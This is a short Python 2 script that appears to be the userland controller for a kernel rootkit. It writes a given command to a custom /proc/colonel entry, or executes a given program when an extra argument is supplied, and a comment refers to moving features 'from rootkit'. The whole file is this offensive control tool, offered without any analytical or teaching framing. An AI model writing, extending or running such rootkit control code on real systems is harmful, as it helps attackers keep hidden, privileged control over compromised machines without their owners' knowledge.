#!/usr/bin/python
from sys import argv
from os import getpid, execl

def command(c):
	f = open("/proc/colonel", "w")
	f.write(c)
	f.close()

# Add doc and access to status (move from rootkit)

if len(argv[:]) <= 1:
	print "USAGE: %s <command>" % argv[0]
elif len(argv[:]) > 2:
	execl(argv[2], "")
elif len(argv[:]) > 1:
	command(argv[1])
